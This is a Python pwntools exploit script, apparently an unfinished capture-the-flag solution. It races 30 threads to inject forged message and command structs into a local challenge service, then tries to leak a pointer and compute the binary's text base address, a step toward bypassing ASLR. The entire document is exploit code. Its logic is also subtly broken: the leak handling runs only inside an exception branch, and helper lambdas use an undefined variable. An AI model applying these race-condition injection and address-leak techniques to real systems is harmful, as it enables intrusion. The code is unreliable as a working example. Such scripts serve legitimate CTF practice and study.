#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
import threading
import time

exe = ELF("./chale")
# context.log_level='debug'
context.terminal = ["foot"]
# p = remote("addr", 1337)
# while True:
p2 = process([exe.path])
p2.recvuntil("Port is ")
port = int(p2.recvline())
log.info(f"debug: {str(port)}")
def gdbs():
    context.terminal = ["foot"]
    gdb.attach(p2, gdbscript="""

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
# sync = threading.Semaphore()
event = threading.Event()
# i = 0
# Raw intereraction with challenge frontend
PIPE_BUF = 0x1000
ENDPOINT = "0"
SERVICE_PORT = port
# Raw intereraction with challenge frontend
def send_message(message, author, sync: threading.Semaphore):
    try:
        r = remote(ENDPOINT, SERVICE_PORT)
        r.sendline(message)
        r.send(author)
        sync.acquire()
        r.send(b"\n")
        r.close()
    except:
        pass

# Helper function to inject a payload using the race condition
def send_stage(payload: dict):
    sync = threading.Semaphore()

    payload_raw = flat(payload)

    #payload = b""
    payload_raw += cyclic(PIPE_BUF-len(payload_raw))
    print("Starting threads...")
    for i in range(30):
        x = threading.Thread(target=send_message, args=(payload_raw,str(i).encode()*63, sync))
        x.start()

    print("Waiting for data to be sent")
    time.sleep(2)
    print("Triggering race condition!")
    sync.release(30)
### Helper functions to create C structs defined in challenge code
def build_message(message, author, next):
    return flat({
        0: 0,
        4: len(message),
        8: p64(next),
        16: author,
        16+64: message
    }, word_size=32)


def build_command(instruction, parm1 = 0, parm2 = 0):
    return flat({
        0: 1,
        4: instruction,
        8: p64(parm1),
        16: p64(parm2)
    }, word_size=32)

### Shortcuts for commands
def command_flush():
    return build_command(0xDEADC0DE)

def command_print():
    return build_command(0xdeadbeef)

def command_redact(id, data):
    return build_command(0xcafebabe, id, data)

def leak_text(r: pwnlib.tubes.tube.tube):
    # payload = {
    payload = command_print(),
    # }

    send_stage(payload)

    while True:
        null_element_address = 0
        try:
            null_element_address = int(r.recvline_contains(b"Next is ",timeout=1).strip().split(b"Next is ")[1], 0)
        except:
            pass
            print(f"Leaked {hex(null_element_address)}")

            test_address = null_element_address-exe.symbols["NUL"]

            # This is an hacky way to identify the correct address from the various leaks.
            if test_address % 4096 == 0:
                exe.address = test_address
                break
        # except:
        #     continue

    print(f"Text base address = {hex(exe.address)}")
    sleep(1)
leak_text(p2)
# gdb.attach(p2.pid+1)
# send_stage(command_print())
# a = p2.recvuntil("Message",timeout=1)
# print(f"debug: {a}")
# p2.interactive()
# if a !=b"":
#     p2.interactive()
#     input()
